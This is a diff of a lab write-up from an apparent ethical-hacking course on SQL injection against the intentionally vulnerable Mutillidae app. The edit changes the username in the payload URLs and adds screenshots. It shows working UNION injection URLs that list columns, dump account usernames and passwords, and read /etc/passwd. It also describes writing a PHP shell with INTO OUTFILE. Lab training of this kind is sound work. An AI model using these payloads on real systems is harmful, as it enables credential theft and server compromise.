@@ -203,22 +203,26 @@ Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns wher
 Here we are trying to extract column names from the “accounts” table.
 
 
+![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/4341dcbe-1e07-4660-b9f3-3abe80330479)
 
 
 
 
 The column names of the accounts is displayed below for the following url:
 
-http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 
 
+http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=robinson%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 
+
+![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/4f649edd-cb7b-4053-9209-8dcd7977c675)
 
 
 Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.
 
 Ex: (union select 1,username,password,is_admin,5 from accounts).
 
-http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
+http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=robinson%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
 
+![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/8b3b5065-eae8-48cb-a650-ac6b176c776c)
 
 
 ## Reading and writing files on the web-server
@@ -226,8 +230,9 @@ We can use the “LOAD_FILE()” operator to peruse the contents of any file con
 
 Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).
 
-http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
+http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=robinson%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
 
+![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/506229d4-6a7a-40dc-8c37-9b2848031885)
 
 
 the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
